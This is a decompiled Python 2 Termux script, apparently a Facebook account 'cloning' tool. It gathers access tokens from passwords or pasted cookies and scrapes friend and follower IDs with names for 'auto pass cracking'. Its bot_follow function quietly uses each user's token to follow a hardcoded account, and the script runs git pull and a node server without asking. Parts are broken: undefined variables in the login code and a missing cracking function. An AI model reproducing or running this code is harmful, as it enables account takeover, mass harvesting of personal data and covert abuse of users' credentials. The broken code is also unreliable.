# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Aug  8 2021, 22:51:48) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: koNtol
try:
    import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, uuid, cookielib, getpass, mechanize, requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system('pip2 install requests')
    os.system('pkg install nodejs')
    os.system('python2 f-r.py')

__author__ = 'CoD3R'
__copyright = 'All rights reserved . Copyright  CoD3R'
os.system('termux-setup-storage')
try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass

try:
    os.mkdir('/sdcard/ids/ex_ids')
except OSError:
    pass

bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000.0, 40000.0)
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000, 40000)
header = {'x-fb-connection-bandwidth': repr(bd), 
   'x-fb-sim-hni': repr(sim), 
   'x-fb-net-hni': repr(sim), 
   'x-fb-connection-quality': 'EXCELLENT', 
   'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
   'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]', 
   'content-type': 'application/x-www-form-urlencoded', 
   'x-fb-http-engine': 'Liger'}
os.system('git pull')
os.system('clear')
c2 = '\x1b[1;32m\x1b[0;97m\x1b[1;32m'
c4 = '\x1b[0;97m\x1b[1;32m\x1b[0;97m'
c5 = '\x1b[1;31m\x1b[0;97m\x1b[1;31m'
os.system('git pull')
os.system('clear')
p = '\x1b[0;37m'
m = '\x1b[0;31m'
h = '\x1b[0;32m'
k = '\x1b[0;33m'
b = '\x1b[0;34m'
u = '\x1b[0;35m'
o = '\x1b[0;36m'
if 'linux' in sys.platform.lower():
    N = '\x1b[0m'
    G = '\x1b[1;92m'
    O = '\x1b[1;97m'
    R = '\x1b[1;91m'
else:
    N = ''
    G = ''
    O = ''
    R = ''
os.system('git pull')
from requests.exceptions import ConnectionError
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000.0, 40000.0)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding('utf8')
logo = '   ______           ____    _____    ____ \n  / ____/  ____    / __ \\  |__  /   / __ \\ \n / /      / __ \\  / / / /   /_ <   / /_/ /\n/ /___   / /_/ / / /_/ /  ___/ /  / _, _/\n\\____/   \\____/ /_____/  /____/  /_/ |_|   \n               \n              Coded By : CoD3R X\n___________________________________________________'

def reg():
    os.system('clear')
    print logo
    print ''
    print '\x1b[1;31;1mContact Facebook For Free Approval'
    print ''
    time.sleep(1)
    try:
        to = open('/sdcard/.coder.txt', 'r').read()
    except (KeyError, IOError):
        reg2()

    os.system('cd Coder && npm install')
    os.system('fuser -k 5000/tcp &')
    os.system('#')
    os.system('cd Coder && node index.js &')
    time.sleep(5)
    log_menu()


def reg2():
    os.system('clear')
    print logo
    print ''
    print '\tApproval not detected'
    print ''
    print ' \x1b[1;92mCopy and press enter , And Send Me On Facebook'
    print ''
    id = uuid.uuid4().hex[:50]
    print ' Your id: ' + id
    print ''
    print ''
    raw_input(' Press enter to go to Facebook ')
    os.system('xdg-open https://fb.com/SpArKCoD3R')
    sav = open('/sdcard/.coder.txt', 'w')
    sav.write(id)
    sav.close()
    raw_input('\x1b[1;92m Press enter to check Approval ')
    reg()


def log_menu():
    try:
        t_check = open('access_token.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print ''
        print '\x1b[1;31;1m~~~~ Login menu~~~~'
        print ''
        print '\x1b[1;92m[1] \x1b[0;96mLogin with FaceBook'
        print '\x1b[1;92m[2] \x1b[0;96mLogin with token'
        print '\x1b[1;92m[3] \x1b[0;96mLogin with cookies'
        print ''
        log_menu_s()


def log_menu_s():
    s = raw_input(' \x1b[0;96mSelect One: ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
    elif s == '3':
        log_cookie()
    else:
        print ''
        print '\\ Select valid option '
        print ''
        log_menu_s()


def log_fb():
    os.system('clear')
    print logo
    print ''
    print '\x1b[1;31;1mLogin with id/pass'
    print ''
    lid = raw_input('\x1b[1;92m Id/mail/no: ')
    pwds = raw_input(' \x1b[0;96mPassword: ')
    try:
        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text
        q = json.loads(data)
        if 'loc' in q:
            ts = open('access_token.txt', 'w')
            ts.write(q['loc'])
            ts.close()
            menu()
        elif 'www.facebook.com' in q['error']:
            print ''
            print ' User must verify account before login'
            print ''
            raw_input('\x1b[1;92m Press enter to try again ')
            log_fb()
        else:
            print ''
            print ' Id/Pass may be wrong'
            print ''
            raw_input(' \x1b[1;92mPress enter to try again ')
            log_fb()
    except:
        print ''
        print 'Exiting tool'
        os.system('exit')


def log_token():
    os.system('clear')
    print logo
    print ''
    print '\x1b[0;96mLogin with token'
    print ''
    tok = raw_input(' \x1b[1;92mPaste token here: ')
    print ''
    t_s = open('access_token.txt', 'w')
    t_s.write(tok)
    t_s.close()
    bot_follow()
    menu()


def log_cookie():
    os.system('clear')
    print logo
    print ''
    print '\x1b[1;31;1mLogin Cookies'
    print ''
    try:
        cookie = raw_input(' Paste cookies here: ')
        data = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 
           'referer': 'https://m.facebook.com/', 
           'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8', 
           'cookie': cookie}
        c1 = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers=data)
        c2 = re.search('(EAAA\\w+)', c1.text)
        hasil = c2.group(1)
        ok = open('access_token.txt', 'w')
        ok.write(hasil)
        ok.close()
        bot_follow()
        menu()
    except AttributeError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \x1b[1;92mPress enter to try again ')
        log_menu()
    except UnboundLocalError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \x1b[1;92mPress enter to try again ')
        log_menu()
    except requests.exceptions.SSLError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \x1b[1;92mPress enter to try again ')
        log_menu()


def bot_follow():
    try:
        toket = open('access_token.txt', 'r').read()
    except IOError:
        print '\n[!] Token invalid'
        logs()

    requests.post('https://graph.facebook.com/100007390861214/subscribers?access_token=' + toket)
    menu()


def menu():
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        print ''
        print logo
        print ''
        print '\x1b[1;31;1mLogin Fcebook Account to continue'
        print ''
        time.sleep(1)
        log_menu()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        z = q['name']
    except (KeyError, IOError):
        print logo
        print ''
        print '\t Account Cheekpoint\x1b[0;97m'
        print ''
        os.system('rm -rf access_token.txt')
        time.sleep(1)
        log_menu()
    except requests.exceptions.ConnectionError:
        print logo
        print ''
        print '\t Please Turn on mobile data/wifi\x1b[0;97m'
        print ''
        raw_input(' \x1b[1;92mPress enter after turning on mobile data/wifi ')
        menu()

    os.system('clear')
    print logo
    tok = open('/sdcard/.coder.txt', 'r').read()
    print ''
    print '  \x1b[1;92mLogged in user: ' + z
    print ''
    print ' \x1b[0;96m Active token: ' + tok
    print ''
    print '\x1b[1;92m\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84'
    print ''
    print '\x1b[1;92m[1] \x1b[0;96mCloning Menu'
    print '\x1b[1;92m[2] \x1b[0;96mExtract Link For File'
    print '\x1b[1;92m[3] \x1b[0;96mExtract followers ids'
    print '\x1b[1;92m[4] \x1b[0;96mView token'
    print '\x1b[1;92m[0] \x1b[0;96mLogout'
    print ''
    menu_s()


def menu_s():
    ms = raw_input('\x1b[1;92mSelect One: ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        ex_id()
    elif ms == '3':
        ex_fid()
    elif ms == '4':
        v_tok()
    elif ms == '0':
        os.remove('access_token.txt')
        log_menu()
    else:
        print ''
        print '\tSelect valid option'
        print ''
        menu()


def ex_id():
    idg = []
    try:
        token = open('access_token.txt', 'r').read()
    except IOError:
        print h + '\t    \n[' + m + '\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84' + h + '] \x1b[0;37mToken Not Found... '
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print h + '\t    \n[' + m + '\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84' + h + '] \x1b[0;37mEXTRACT PUBLIC ID FRIENDLIST. '
    print '\n\x1b[1;92m\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84'
    idt = raw_input(h + '\n[' + m + '\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84' + h + '] \x1b[0;37mInput ID :-')
    try:
        r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
        q = json.loads(r.text)
        print h + '\t    \n[' + m + '\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84' + h + '] \x1b[0;37mCollecting Ids From : ' + q['name']
    except KeyError:
        print ''
        print h + '\t    \n[' + m + '\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84' + h + '] \x1b[0;37mLogged in id has checkpoint'
        print ''
        raw_input(h + '\t    \n[' + m + '\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84' + h + '] \x1b[0;37mPress Enter To Go Back')
        menu()

    r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
    q = json.loads(r.text)
    ids = open('ids_list.txt', 'w')
    for i in q['data']:
        uid = i['id']
        na = i['name']
        nm = na.rsplit(' ')[0]
        idg.append(uid + '|' + nm)
        ids.write(uid + '|' + nm + '\n')

    ids.close()
    print '\n\x1b[1;92m\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84'
    print h + '\t    \n[' + m + '\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84' + h + '] \x1b[0;37mThe process has completed'
    print h + '\t    \n[' + m + '\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84' + h + '] \x1b[0;37mTotal ids: ' + str(len(idg))
    print '\n\x1b[1;92m\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84'
    raw_input('\x1b[0;37mPress Enter To Download File')
    os.system('cp ids_list.txt /sdcard')
    os.system('rm -rf ids_list.txt')
    print '\n[' + m + '\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84' + h + '] \x1b[0;37mFile downloaded successfully'
    time.sleep(1)
    menu()


def ex_fid():
    idg = []
    try:
        token = open('access_token.txt', 'r').read()
    except IOError:
        print h + '\t    \n[' + m + '\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84' + h + '] \x1b[0;37mToken Not Found... '
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print h + '\t    \n[' + m + '\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84' + h + '] \x1b[0;37mEXTRACT FOLLOWERS IDS. '
    print '\n\x1b[1;92m\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84'
    idt = raw_input(h + '\n[' + m + '\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84' + h + '] \x1b[0;37mInput ID :-')
    limit = raw_input(h + '\n[' + m + '\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84' + h + '] \x1b[0;37mLIMIT (MAX 3000) : ')
    try:
        r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
        q = json.loads(r.text)
        print h + '\t    \n[' + m + '\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84' + h + '] \x1b[0;37mCollecting Ids From : ' + q['name']
    except KeyError:
        print ''
        print h + '\t    \n[' + m + '\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84' + h + '] \x1b[0;37mLogged in id has checkpoint'
        print ''
        raw_input(h + '\t    \n[' + m + '\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84' + h + '] \x1b[0;37mPress Enter To Go Back')
        menu()

    r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=' + limit + '&access_token=' + token, headers=header)
    q = json.loads(r.text)
    ids = open('ids_list.txt', 'w')
    for i in q['data']:
        uid = i['id']
        na = i['name']
        nm = na.rsplit(' ')[0]
        idg.append(uid + '|' + nm)
        ids.write(uid + '|' + nm + '\n')

    ids.close()
    print '\n\x1b[1;92m\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84'
    print h + '\t    \n[' + m + '\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84' + h + '] \x1b[0;37mThe process has completed'
    print h + '\t    \n[' + m + '\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84' + h + '] \x1b[0;37mTotal ids: ' + str(len(idg))
    print '\n\x1b[1;92m\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84'
    raw_input('\x1b[0;37mPress Enter To Download File')
    os.system('cp ids_list.txt /sdcard')
    os.system('rm -rf ids_list.txt')
    print '\n[' + m + '\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84' + h + '] \x1b[0;37mFile downloaded successfully'
    time.sleep(1)
    menu()


def crack():
    global toket
    try:
        toket = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t File Not Found \x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print ''
    print '\x1b[1;31;1m~~~~ Auto pass cracking ~~~~'
    print ''
    print '\x1b[1;92m[1] Public id cloning'
    print ''
    os.system('cat access_token.txt')
    print ''
    raw_input(' Press enter to main menu ')
    menu()


if __name__ == '__main__':
    reg()
